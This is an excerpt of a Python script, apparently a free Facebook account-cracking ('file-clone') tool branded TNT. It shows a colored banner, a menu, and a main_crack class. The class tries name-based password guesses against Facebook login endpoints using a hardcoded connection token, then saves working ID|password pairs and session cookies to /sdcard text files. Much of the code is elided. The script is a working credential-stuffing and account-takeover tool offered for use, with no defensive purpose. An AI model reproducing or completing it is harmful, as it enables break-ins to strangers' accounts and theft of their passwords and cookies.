...
######## ##    ## ######## 
   ...
   ##    ##   ###    ##    
   ##    ##    ##    ##    
\033[1;32mK \033[1;33mM \033[1;34mT \033[1;35mC \033[1;36mH \033[1;37mO~~~\033[1;37m[ALL TIME \033[1;37m FIREðŸ”¥ðŸ”¥]
\033[1;32m--------------------------------------------------------
\033[1;37m[\033[1;32mâ€¢\033[1;37m]\033[1;32mFACEBOOK       : \033[1;33mKmatcho Al-hontkor
\033[1;37m[\033[1;32mâ€¢\033[1;37m]\033[1;32mTOOLS          : \033[1;33mFILE-CLONE
\033[1;37m[\033[1;32mâ€¢\033[1;37m]\033[1;32mSTATUS         : \033[1;33mFREE
\033[1;37m[\033[1;32mâ€¢\033[1;37m]\033[1;32mWORKING        : \033[1;33mDATA
\033[1;37m[\033[1;31mâ€¢\033[1;37m]\033[1;31mVERSION        : \033[1;31m2.1
\033[1;32m------------------------------------------------------"""
def clear():
    os.system("clear")
    print(logo) 
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print("-----------------------------------------------------")
        input("Press enter to back TNT Menu ")
        exit()
...
def DANGER():   
    ...
    print(f'[2] Join FACEBOOK ')
    print(f'[3] Join Admin ')
    print('')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[TNT] \033[1;33m{loop} \033[1;32m| \033[1;34mM1 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [TNT-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/TNT_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DANGER_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/TNT_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[TNT] \033[1;33m{loop} \033[1;32m| \033[1;34mM2 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r\033[1;32m[TNT] \033[1;33m{loop} \033[1;32m| \033[1;34mM3 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [TNT-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/TNT_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
